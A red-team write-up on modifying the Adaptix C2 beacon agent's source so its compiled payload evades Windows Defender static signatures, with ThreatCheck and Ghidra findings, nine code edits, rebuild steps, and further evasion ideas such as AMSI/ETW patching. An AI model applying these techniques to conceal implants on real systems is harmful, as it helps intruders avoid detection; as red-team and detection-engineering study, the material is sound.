---
title: "Hardening Adaptix C2 - Beacon Source Modifications"
kicker: "Offensive Security . C2 Infrastructure . OPSEC"
tags: "Adaptix C2 . OPSEC . Red Team . Static Evasion . Source Modification"
lead: "Modifying the Adaptix C2 beacon agent source code to remove static detection signatures from the compiled payload. Finding what gets flagged, tracing it back to the source, and making targeted edits to change the compiled output without breaking functionality."
---

> This guide assumes a working Adaptix C2 deployment with the hardening from [Part 1: Reducing Infrastructure and Agent Fingerprints](writeup.html?file=writeups/adaptix-hardening.md) already applied.

## How This Process Works

The goal is to take a generated Adaptix agent payload (an `.exe` file), find the byte patterns that security tools flag, trace those patterns back to the original source code, and modify the source so the compiler produces different bytes while keeping the same behavior.

The workflow for each change follows the same cycle:

1. **Find the bad bytes.** Run ThreatCheck against the generated payload. ThreatCheck does a binary search through the file, splitting it in half repeatedly and testing each half against Windows Defender (or AMSI). It narrows down to the exact region of bytes that triggers a detection and reports the offset (the position in the file, counted in bytes from the start) where the flagged region begins.

2. **Identify what those bytes are.** Open the payload in Ghidra (a reverse engineering tool that disassembles and decompiles binaries). Navigate to the offset ThreatCheck reported. Ghidra shows you what that region actually is: it might be compiled code (instructions), or it might be data (strings, tables, constants). If it is code, Ghidra can decompile it back into a C-like representation so you can read what the function does.

3. **Trace it back to the source.** Compare what Ghidra shows you with the actual source code. The Adaptix beacon source is open, so you can match the decompiled output to the original `.cpp` files and find exactly which lines of code produced the flagged bytes.

4. **Edit the source.** Modify the source code so it compiles into different byte patterns. The key constraint is that the behavior must stay the same. You are not changing what the code does, only how the compiler expresses it in machine code.

5. **Rebuild, redeploy, and retest.** Compile the modified source, copy the new object files to where the teamserver expects them, restart the teamserver, generate a fresh payload, and run ThreatCheck again. If the flagged region is gone, move on. If ThreatCheck finds a new region deeper in the binary, repeat the cycle.

This is an iterative process. Fixing one detection region often reveals another one behind it, because ThreatCheck stops at the first match. You keep going until ThreatCheck reports clean (or only flags structural padding that cannot be changed).

**Agent generation setting:** When generating each agent on the Adaptix client, the "IAT Hiding (empty import table)" option was selected. This tells the teamserver to produce a payload with an empty import address table. Normally, a Windows executable lists all the DLL functions it needs in its import table, and that table is a rich source of fingerprinting (tools like `imphash` generate a hash of it). With IAT hiding enabled, the payload resolves all its API calls at runtime through its own loader instead of declaring them in the import table, which removes that fingerprint. All the changes documented here were made and tested with this option enabled.

---

## Project Structure

All changes target the beacon agent source at:

```
/opt/AdaptixC2/AdaptixServer/extenders/beacon_agent/src_beacon/beacon/
```

The teamserver does not ship pre-compiled payloads. Instead, it keeps a set of `.o` object files (pre-compiled chunks of code) and links them together into a final payload each time you generate an agent. These object files live at:

```
/opt/AdaptixC2/dist/extenders/beacon_agent/objects_http/   (and objects_smb, objects_tcp, objects_dns)
```

This means that after you modify source code and recompile, you need to copy the new `.o` files into the `dist/` directory and restart the teamserver. Every payload generated after that will use your modified code.

---

## HTTP Agent

After generating an HTTP agent and running ThreatCheck against it, several detection regions were identified. Each one was traced back through Ghidra to the source and fixed. The changes below are listed in the order they were found and addressed.

### Files Modified

1. `src_beacon/beacon/std.cpp` - Vector and Map container implementations
2. `src_beacon/beacon/main.cpp` - WinMain entry point
3. `src_beacon/beacon/Encoders.cpp` - Base64 character table
4. `src_beacon/Makefile` - Compiler flags

---

### Change 1: Vector::resize() in std.cpp

**What ThreatCheck found:** A region of bytes in the compiled code section.

**What Ghidra showed:** When decompiled, this region turned out to be a function that allocates new memory, copies data element by element in a loop, then frees the old memory. This three-step pattern (allocate, copy-loop, free) produced a recognizable code structure:

```c
lVar3 = (**(code **)(DAT_140019008 + 0x120))(param_1[3],0,param_2 * 0x18);  // HeapAlloc
if (lVar3 == 0) {
    uVar4 = 0;
} else {
    if (*param_1 != 0) {
        for (local_18 = 0; local_18 < (ulonglong)param_1[2]; local_18 = local_18 + 1) {
            // element copy loop
        }
        (**(code **)(DAT_140019008 + 0x140))(param_1[3],0,*param_1);  // HeapFree
    }
    *param_1 = lVar3;
    param_1[1] = param_2;
```


**Tracing to source:** This matched the `Vector::resize()` function in `std.cpp`.

**Original code:**

```cpp
BOOL resize(size_t new_capacity) {
    T* new_data = static_cast<T*>(ApiWin->HeapAlloc(v_heapHandle, 0, new_capacity * sizeof(T)));
    if (!new_data) return false;

    if (v_data) {
        for (size_t i = 0; i < v_size; ++i) {
            new_data[i] = v_data[i];
        }
        ApiWin->HeapFree(v_heapHandle, 0, v_data);
    }

    v_data = new_data;
    v_capacity = new_capacity;
    return true;
}
```

**Modified code:**

```cpp
BOOL resize(size_t new_capacity) {
    size_t alloc_size = new_capacity * sizeof(T);
    T* result = v_data
        ? static_cast<T*>(ApiWin->HeapReAlloc(v_heapHandle, 0, v_data, alloc_size))
        : static_cast<T*>(ApiWin->HeapAlloc(v_heapHandle, 0, alloc_size));
    if (!result) return false;
    v_data = result;
    v_capacity = new_capacity;
    return true;
}
```

**What changed:** Instead of allocating new memory, copying items one by one, and freeing the old memory (three steps), this uses `HeapReAlloc`, which does all three in one call. If there is existing data, HeapReAlloc resizes and moves it internally. If there is no existing data, it falls back to a regular HeapAlloc. The copy loop and the HeapFree call are both gone. The decompiled output is now a single conditional call with no loop, which looks completely different to signature scanners.

---

### Change 2: Map::resize() in std.cpp

**What ThreatCheck found:** Another instance of the same alloc-loop-free pattern, at a different offset in the binary.

**What Ghidra showed:** A structurally identical function to Change 1, but operating on key-value pairs instead of single elements. Because C++ templates generate separate compiled code for each type they are used with, both the `Vector` and `Map` versions of `resize()` appeared as separate functions in the binary, each producing their own copy of the signature.

**Tracing to source:** This matched `Map::resize()` in `std.cpp`.

**Original code:**

```cpp
BOOL resize(size_t new_capacity) {
    Pair* new_data = static_cast<Pair*>(ApiWin->HeapAlloc(m_heapHandle, 0, new_capacity * sizeof(Pair)));
    if (!new_data) return false;

    if (m_data) {
        for (size_t i = 0; i < m_size; ++i) {
            new_data[i] = m_data[i];
        }
        ApiWin->HeapFree(m_heapHandle, 0, m_data);
    }

    m_data = new_data;
    m_capacity = new_capacity;
    return true;
}
```

**Modified code:**

```cpp
BOOL resize(size_t new_capacity) {
    size_t alloc_size = new_capacity * sizeof(Pair);
    Pair* result = m_data
        ? static_cast<Pair*>(ApiWin->HeapReAlloc(m_heapHandle, 0, m_data, alloc_size))
        : static_cast<Pair*>(ApiWin->HeapAlloc(m_heapHandle, 0, alloc_size));
    if (!result) return false;
    m_data = result;
    m_capacity = new_capacity;
    return true;
}
```

**What changed:** Same fix as Change 1. Replaced the alloc-loop-free pattern with a HeapReAlloc ternary. Both template instances in the binary now produce the new pattern.

---

### Change 3: Vector::destroy() in std.cpp

**What ThreatCheck found:** Another flagged region in the code section, near the resize functions.

**What Ghidra showed:** A short function that calls HeapFree (the same offset pointer seen in the resize functions) followed by HeapDestroy. The HeapFree call produced the same byte pattern that was already being matched in the resize functions, giving detection tools a third match point.

**Tracing to source:** This matched `Vector::destroy()` in `std.cpp`.

**Original code:**

```cpp
void destroy() {
    if (v_data) {
        ApiWin->HeapFree(v_heapHandle, 0, v_data);
    }
    ApiWin->HeapDestroy(v_heapHandle);
}
```

**Modified code:**

```cpp
void destroy() {
    if (v_data)
        memset(v_data, 0, v_capacity * sizeof(T));
    ApiWin->HeapDestroy(v_heapHandle);
    v_data = nullptr;
}
```

**What changed:** Removed the HeapFree call. This is safe because HeapDestroy already frees all memory that was allocated from that heap, so calling HeapFree right before it was redundant. In its place, a `memset` zeros out the buffer before the heap is destroyed. This has a security benefit: it scrubs any sensitive data (agent config, command output, connection state) from memory before releasing it. The `v_data = nullptr` at the end is a safety measure to prevent the code from accidentally using the pointer after the memory is gone.

---

### Change 4: Map::destroy() in std.cpp

**What ThreatCheck found:** Same HeapFree byte pattern at yet another offset.

**What Ghidra showed:** Same HeapFree + HeapDestroy structure as Change 3, but for the Map class.

**Tracing to source:** This matched `Map::destroy()` in `std.cpp`.

**Original code:**

```cpp
void destroy() {
    if (m_data) {
        ApiWin->HeapFree(m_heapHandle, 0, m_data);
    }
    ApiWin->HeapDestroy(m_heapHandle);
}
```

**Modified code:**

```cpp
void destroy() {
    if (m_data)
        memset(m_data, 0, m_capacity * sizeof(Pair));
    ApiWin->HeapDestroy(m_heapHandle);
    m_data = nullptr;
}
```

**What changed:** Same fix as Change 3. Removed HeapFree, added memset zeroing, added null pointer assignment.

---

### Change 5: WinMain entry point in main.cpp

**What ThreatCheck found:** A flagged region at the very start of the executable code.

**What Ghidra showed:** The program's entry point decompiled to an extremely simple and recognizable pattern:

```c
undefined8 entry(void)
{
    FUN_14000e607();
    return 0;
}
```

This is just: call one function, return zero. Ghidra could directly resolve the function name, meaning anyone looking at the binary could immediately identify the agent's main loop just from the entry point. This clean, minimal entry point is a signature in itself.

**Tracing to source:** This matched the `WinMain` function in `main.cpp`.

**Original code:**

```cpp
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    AgentMain(NULL);
    return 0;
}
```

**Modified code:**

```cpp
typedef void (*agent_func)(void*);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    agent_func run = (agent_func)AgentMain;
    run((void*)(ULONG_PTR)(nCmdShow ^ nCmdShow));
    return (int)(ULONG_PTR)hPrevInstance;
}
```

**What changed:** Three things, all producing the same runtime result but different compiled bytes:

1. Instead of calling `AgentMain` directly, the code stores it in a local function pointer variable and calls through that. Ghidra can resolve direct function calls, but it cannot resolve indirect calls through variables. So the decompiled output now shows `(*local_8)(...)` instead of a named function, breaking the direct link between the entry point and the agent's main loop.

2. Instead of passing `NULL` directly, the code computes zero by XORing `nCmdShow` with itself (`nCmdShow ^ nCmdShow`). Any value XORed with itself is always zero. But the compiler produces a different instruction sequence for "XOR a register with itself" than for "load the constant zero," so the bytes change.

3. Instead of returning the literal `0`, the code returns `hPrevInstance`. In all modern Windows applications (everything after Windows 3.1), `hPrevInstance` is always NULL, so the return value is still zero. But the compiler generates a register move from a stack parameter instead of just zeroing a register, producing different bytes.

---

### Change 6: Base64 character table in Encoders.cpp

**What ThreatCheck found:** A flagged region in the data section of the binary (not code, but stored constants).

**What Ghidra showed:** This was the Base64 alphabet table, a 64-character array (`A-Z`, `a-z`, `0-9`, `+`, `/`). The array ended with a null terminator byte (`0x00`), and the compiler had added extra null bytes after it for alignment padding. This block of consecutive null bytes was confusing ThreatCheck's binary search. It would land in the null padding and could not scan past it to find the actual signatures deeper in the file.

**Tracing to source:** This matched the `b64chars` array in `Encoders.cpp`.

**Original code:**

```cpp
char b64chars[] = { 'A', 'B', 'C', ..., '9', '+', '/', 0 };
```

**Modified code:**

```cpp
char b64chars[64] = { 'A', 'B', 'C', ..., '9', '+', '/' };
```

**What changed:** Removed the trailing `0` (null terminator) and set the array size to exactly 64. Without the null terminator, the compiler does not add alignment padding after the array. The code never treats this array as a string. It only accesses it by index position (`b64chars[0]` through `b64chars[63]`), so the null terminator was never needed.

---

### Change 7: Compiler flags in Makefile

**What ThreatCheck found:** Flagged regions in the data section containing readable C++ class names.

**What Ghidra showed:** Strings like `N10__cxxabiv120__si_class_type_infoE` and `__cxxabiv117__class_type_infoE` sitting in the binary. These are RTTI (Run-Time Type Information) strings. C++ compiler embeds these automatically for classes that uses virtual functions. They contain the class names and inheritance structure, which leaks internal details about how the agent is built and gives detection tools another string to match on.

**Tracing to source:** This was not caused by any specific line of code. RTTI is generated automatically by the compiler unless you tell it not to.

**File:** `src_beacon/Makefile`

**Original flags:**

```makefile
OPTIMIZATION_FLAGS := -fno-exceptions \
                     -fno-unwind-tables \
                     -fno-asynchronous-unwind-tables
```

**Modified flags:**

```makefile
OPTIMIZATION_FLAGS := -fno-exceptions \
                     -fno-rtti \
                     -fno-unwind-tables \
                     -fno-asynchronous-unwind-tables
```

**What changed:** Added the `-fno-rtti` compiler flag. This tells the compiler to not include any type information in the binary. The RTTI strings, vtable type pointers, and support for C++ features like `dynamic_cast` and `typeid` are all stripped out. The beacon source never uses those features, so removing RTTI has no effect on functionality. This flag applies to all build targets (HTTP, SMB, TCP, DNS) and both architectures (x64, x86).

---

## SMB Agent

After applying the changes above and generating an SMB agent, ThreatCheck found a new set of bad bytes ending at offset `0x14016`. The previous changes (1-7) had already been applied since they modify shared source files used by all agent types. But fixing those earlier detections revealed new ones deeper in the binary that ThreatCheck could not reach before.

The flagged region contained readable strings: `api-ms-win-`, `ext-ms-`, and `\\.\pipe\%08lx`, followed by blocks of null byte padding.

### Files Modified

1. `src_beacon/beacon/ProcLoader.cpp` - API-set forwarding string detection
2. `src_beacon/beacon/Commander.cpp` - Shell pipe name format string

---

### Change 8: API-set string literals in ProcLoader.cpp

**What ThreatCheck found:** A flagged region in the data section containing the readable strings `api-ms-win-` and `ext-ms-`.

**What Ghidra showed:** These strings were stored as plain text constants in the binary's read-only data section (`.rdata`). They were used by the function that resolves API calls. When Windows DLLs forward an exported function to another DLL, the forwarding target sometimes points to an "API set" DLL (names starting with `api-ms-win-` or `ext-ms-`). The resolver needs to detect these to handle them differently. The original code compared module names against these two string literals.

**Tracing to source:** This matched the forwarding resolution logic in `GetSymbolAddress()` in `ProcLoader.cpp`. The strings appeared as literal `"api-ms-win-"` and `"ext-ms-"` arguments passed to the comparison function.

**Original code:**

```cpp
BOOL isApiSetDll = FALSE;
if (StrLenA(moduleName) > 11 && StrNCmpA(moduleName, (char*)"api-ms-win-", 11) == 0) 
    isApiSetDll = TRUE;
else if (StrLenA(moduleName) > 7 && StrNCmpA(moduleName, (char*)"ext-ms-", 7) == 0)
    isApiSetDll = TRUE;
```

**Modified code:**

```cpp
BOOL isApiSetDll = FALSE;
char apiPfx[] = {'a','p','i','-','m','s','-','w','i','n','-',0};
char extPfx[] = {'e','x','t','-','m','s','-',0};
if (StrLenA(moduleName) > 11 && StrNCmpA(moduleName, apiPfx, 11) == 0)
    isApiSetDll = TRUE;
else if (StrLenA(moduleName) > 7 && StrNCmpA(moduleName, extPfx, 7) == 0)
    isApiSetDll = TRUE;
```

**What changed:** The string literals were replaced with character arrays that are built on the stack at runtime. When you write a string literal like `"api-ms-win-"` in C/C++, the compiler stores that entire string as readable text in the binary's data section. Any tool that scans the binary (even a simple `strings` command) can find it.

When you instead declare a char array with individual character values like `{'a','p','i','-',...}`, the compiler handles it differently. Instead of placing the string in the data section, it generates a series of `mov` instructions in the code section that build the string on the stack when the function runs. The characters are encoded as parts of CPU instructions, not as a readable string. A signature scanner looking for the string `api-ms-win-` in the binary will not find it.

The comparison logic is identical. The function still checks the same prefixes and behaves the same way. This change affects all agent types since ProcLoader.cpp is shared code.

---

### Change 9: Pipe format string in Commander.cpp

**What ThreatCheck found:** The readable string `\\.\pipe\%08lx` in the data section, in the same flagged region as the API-set strings.

**What Ghidra showed:** A format string stored in the read-only data section. This string is a template used to generate random pipe names when the agent executes shell commands. It has nothing to do with the SMB agent's listener pipe (that name comes from the teamserver configuration). This format string is used by all agent types when they need to pipe stdin/stdout to a spawned process. It takes a random 32-bit number and formats it as an 8-character hex string to create a pipe name like `\\.\pipe\a3f7b219`.

**Tracing to source:** This matched two `snprintf` calls in Commander.cpp that both used the same format string literal `"\\\\.\\pipe\\%08lx"`. One creates the stdout pipe for the spawned process, the other creates the stdin pipe.

**Original code:**

```cpp
ULONG r1 = GenerateRandom32();

CHAR* pipeName = (CHAR*) MemAllocLocal(18);
ApiWin->snprintf(pipeName, 18, "\\\\.\\pipe\\%08lx", r1);

HANDLE beaconOutPipe = ApiWin->CreateNamedPipeA(pipeName, ...);
HANDLE shellOutPipe  = ApiWin->CreateFileA(pipeName, ...);

r1 = GenerateRandom32();
ApiWin->snprintf(pipeName, 18, "\\\\.\\pipe\\%08lx", r1);
```

**Modified code:**

```cpp
CHAR pipeFmt[] = {'\\','\\','.','\\','p','i','p','e','\\','%','0','8','l','x',0};

ULONG r1 = GenerateRandom32();

CHAR* pipeName = (CHAR*) MemAllocLocal(18);
ApiWin->snprintf(pipeName, 18, pipeFmt, r1);

HANDLE beaconOutPipe = ApiWin->CreateNamedPipeA(pipeName, ...);
HANDLE shellOutPipe  = ApiWin->CreateFileA(pipeName, ...);

r1 = GenerateRandom32();
ApiWin->snprintf(pipeName, 18, pipeFmt, r1);
```

**What changed:** Same technique as Change 8. The format string literal is replaced with a stack-built char array. The string `\\.\pipe\%08lx` no longer appears as readable text anywhere in the binary. The `pipeFmt` array is declared once and reused for both snprintf calls. The pipe naming behavior is unchanged: two random pipe names are still generated per shell execution.

---

## Result After All Changes

### HTTP Agent Result

After applying Changes 1-7 and running ThreatCheck against the HTTP agent, the output looked like this:

```
[*] Testing 90068 bytes
[*] Threat found, splitting
[*] Testing 89534 bytes
[*] Threat found, splitting
[*] Testing 89267 bytes
[*] Threat found, splitting
[*] Testing 89133 bytes
[*] Threat found, splitting
[*] No threat found, increasing size
[*] Testing 90134 bytes
[*] No threat found, increasing size
[*] Testing 90635 bytes
[*] Threat found, splitting
[*] Testing 90384 bytes
[*] Threat found, splitting
...
[*] Threat found, splitting
[*] Testing 90135 bytes
[*] Threat found, splitting
[!] Identified end of bad bytes at offset 0x16017
00015F17  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00015F27  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00015F37  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
...
00016007  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
[*] Run time: 7.24s
```

The flagged region is nothing but null bytes. But look at the binary search output above it: ThreatCheck is still finding "Threat found" repeatedly as it narrows down. **The binary is still being detected by Defender.** The source-level changes eliminated the specific string and code pattern signatures, but Defender is still flagging the payload.

When ThreatCheck's binary search converges on a region of all null bytes, it means ThreatCheck can no longer isolate a specific byte sequence that causes the detection. The detection is not triggered by one identifiable pattern anymore. Instead, Defender is likely detecting based on something broader:

- **The overall structure of the PE file** (section layout, entry point characteristics, header values). These are fingerprints that exist independently of the code content.
- **A combination of multiple features across the binary** rather than a single signature. Individually, no one feature triggers a detection, but together they exceed a scoring threshold.
- **Heuristic scoring** where enough "suspicious" attributes (small import table, unusual section sizes, specific compiler artifacts) add up to a classification.

So removing the bad bytes worked for what it targeted. The recognizable code patterns (alloc-loop-free, clean WinMain entry point), the RTTI type name strings, and the Base64 table null padding are gone. ThreatCheck cannot point to a specific string or code region anymore. But Defender still flags the binary through other detection methods that are not based on matching a specific byte sequence.

### SMB Agent Result

After applying the same shared changes plus the SMB-specific fixes (Changes 8 and 9), ThreatCheck against the SMB agent showed:

```
[*] Threat found, splitting
[*] Testing 81904 bytes
[*] Threat found, splitting
[*] Testing 81898 bytes
[*] Threat found, splitting
[*] Testing 81895 bytes
[*] Threat found, splitting
[*] Testing 81893 bytes
[*] Threat found, splitting
[!] Identified end of bad bytes at offset 0x13FE5
00013EE5  16 FF FF 2C 16 FF FF 2D  13 FF FF 2C 16 FF FF 2C  .yy,.yy-.yy,.yy,
00013EF5  16 FF FF 2C 16 FF FF 2C  16 FF FF FB 11 FF FF EE  .yy,.yy,.yyu.yyi
00013F05  15 FF FF 2C 16 FF FF 1D  12 FF FF 2C 16 FF FF 4F  .yy,.yy..yy,.yyO
00013F15  13 FF FF C7 12 FF FF CF  15 FF FF 2C 16 FF FF 93  .yyC.yyI.yy,.yy.
00013F25  13 FF FF B5 13 FF FF D7  13 FF FF 2C 16 FF FF 2C  .yym.yyx.yy,.yy,
00013F35  16 FF FF 83 12 FF FF A5  12 FF FF 2C 16 FF FF 2C  .yy..yy..yy,.yy,
00013F45  16 FF FF 3F 12 FF FF 2C  16 FF FF 2C 16 FF FF 2C  .yy?.yy,.yy,.yy,
00013F55  16 FF FF 2C 16 FF FF 2C  16 FF FF 2C 16 FF FF 2C  .yy,.yy,.yy,.yy,
00013F65  16 FF FF 2C 16 FF FF 2C  16 FF FF 2C 16 FF FF 2C  .yy,.yy,.yy,.yy,
00013F75  16 FF FF C5 14 FF FF E7  14 FF FF 09 15 FF FF 2B  .yyA.yyc.yy..yy+
00013F85  15 FF FF 91 15 FF FF B0  15 FF FF 2C 16 FF FF 4D  .yy..yy..yy,.yyM
00013F95  15 FF FF 6F 15 FF FF 5F  14 FF FF 81 14 FF FF 00  .yyo.yy_.yy..yy.
00013FA5  00 00 00 00 00 00 00 00  00 00 00 10 70 01 40 01  ............p.@.
00013FB5  00 00 00 00 00 00 00 00  00 00 00 08 70 01 40 01  ............p.@.
00013FC5  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00013FD5  00 00 00 00 00 00 00 00  00 00 00 F7 BF 00 40 01  ............?.@.
[*] Run time: 53.96s
```

Same situation as the HTTP agent. The `api-ms-win-`, `ext-ms-`, and `\\.\pipe\%08lx` strings are gone. ThreatCheck can no longer point to a readable string or recognizable code pattern. What remains in the flagged region is:

- **`FF FF` / `2C 16` repeating byte patterns** (offsets 0x13EE5-0x13F95). These are profile/config placeholder bytes. The teamserver reserves space in the binary for HTTP profile fields (server addresses, ports, URIs, headers, user agent, etc.) and fills them at generation time. For the SMB agent, these HTTP fields are unused, so they remain as filler bytes. This is not something that can be fixed by editing source code. The filler is injected by the teamserver's linker at payload generation time, not compiled from source.
- **Null bytes with pointer-like values** (offsets 0x13FA5-0x13FD5). Structural padding and alignment data, same as the HTTP agent result.

The bad bytes offset also shifted down from the original `0x14016` (before Changes 8 and 9) to `0x13FE5` (after). This confirms the string removals worked. The binary shrank slightly because the `api-ms-win-`, `ext-ms-`, and pipe format strings are no longer stored in the `.rdata` section. ThreatCheck is now landing on config filler instead.

### What This Means

This is the limit of what source-level signature removal can achieve. The specific strings and code patterns that ThreatCheck could identify and isolate have been eliminated. Both the HTTP and SMB agents now converge on structural data (PE padding, config filler) that cannot be addressed through source edits.

However, Defender still detects both payloads. The "Threat found, splitting" messages in the binary search confirm this. The next steps to investigate would be:

- **PE header modifications** - Rich header removal, timestamp zeroing, section name changes, debug directory stripping. These are structural fingerprints that exist outside the code.
- **Shellcode output instead of exe** (if the Adaptix client supports it), loaded through a custom stager. This removes the PE structure entirely.
- **Packing or encryption** - wrapping the payload so the raw bytes never touch disk in the clear.
- **Runtime evasion** - sleep obfuscation, syscall unhooking, AMSI/ETW patching, which address behavioral detection rather than static detection.

---

## Build and Deploy

After making source changes, rebuild and redeploy:

```bash
# 1. Rebuild the beacon objects
cd /opt/AdaptixC2/AdaptixServer/extenders/beacon_agent/src_beacon
make clean && make

# 2. Copy rebuilt objects to the teamserver's runtime directory
cp objects_http/* /opt/AdaptixC2/dist/extenders/beacon_agent/objects_http/
cp objects_smb/* /opt/AdaptixC2/dist/extenders/beacon_agent/objects_smb/
cp objects_tcp/* /opt/AdaptixC2/dist/extenders/beacon_agent/objects_tcp/
cp objects_dns/* /opt/AdaptixC2/dist/extenders/beacon_agent/objects_dns/

# 3. Restart the teamserver
systemctl restart adaptix
```

A note on the build system: if you run `make` from the parent directory (`beacon_agent/`) instead of `src_beacon/`, the Makefile moves the compiled objects into `beacon_agent/dist/` using `mv`, which removes them from `src_beacon/`. In that case, copy from `beacon_agent/dist/objects_http/` instead. Also, the `src_beacon/` Makefile uses flags that suppress compiler output (`@` prefixes) and warnings (`-w`), so build errors can be silent. If something goes wrong, compile individual files manually without those flags to see error messages.

The teamserver links the `.o` files into a final payload each time you generate an agent. It does not cache previously compiled payloads. So every payload generated after you copy the new objects will use your modified code.

---

## Verification

After generating a new payload, verify the changes worked:

1. **ThreatCheck:** Run it against the new payload. The previously flagged regions (alloc-loop-free patterns, Base64 table, RTTI strings, API-set strings, pipe format string) should no longer trigger. ThreatCheck may still flag blocks of null bytes that come from PE section padding. These are structural to how Windows executables are laid out and cannot be removed.

2. **Ghidra:** Open the new payload and check the modified functions. The WinMain entry point should show an indirect call through a variable (not a direct named function call). The resize functions should show a single conditional HeapReAlloc/HeapAlloc call with no copy loop. The destroy functions should show memset followed by HeapDestroy with no HeapFree.

3. **Strings:** Run `strings` on the binary and confirm that `__cxxabiv1` type names, `api-ms-win-`, `ext-ms-`, and `\\.\pipe\%08lx` no longer appear as readable strings.

---

## What These Changes Do Not Address

Everything described here targets static signatures: specific byte patterns and readable strings that exist in the file on disk. These are the easiest type of detection to address because you can directly see and modify what triggers them. However, there are other detection methods that these changes do not help with:

- **PE header metadata** - The Rich header, section names, section characteristics, and import hash (imphash) are all part of the executable structure and can be fingerprinted independently of the code content.
- **Behavioral detection** - What the agent does at runtime (the sequence of API calls it makes, how it allocates memory, how it communicates) can be detected by EDR even if the on-disk binary looks clean.
- **Heuristic/ML classification** - Machine learning models used by endpoint protection can classify binaries based on structural features that go beyond simple byte matching.
- **Code signing** - The binary is unsigned, which is itself a signal to security tools.
- **Delivery method** - How the payload gets onto the target and how it is executed are separate detection surfaces.
